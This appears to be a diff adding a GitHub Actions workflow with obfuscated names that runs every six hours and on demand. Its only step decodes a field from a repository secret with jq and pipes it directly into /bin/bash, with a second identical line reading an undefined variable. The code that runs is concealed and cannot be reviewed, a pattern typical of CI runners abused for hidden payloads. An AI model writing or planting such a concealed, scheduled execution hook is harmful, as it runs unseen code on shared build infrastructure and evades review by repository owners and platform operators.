@@ -1,0 +1,20 @@
+name: majhabnk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: majhabnk
+        env:
+          h9719: ${{ secrets.h9719 }}
+        run: |
+          echo $h9719 | jq -r .om78 | /bin/bash
+          echo $yac3 | jq -r .nbxv66875 | /bin/bash
+
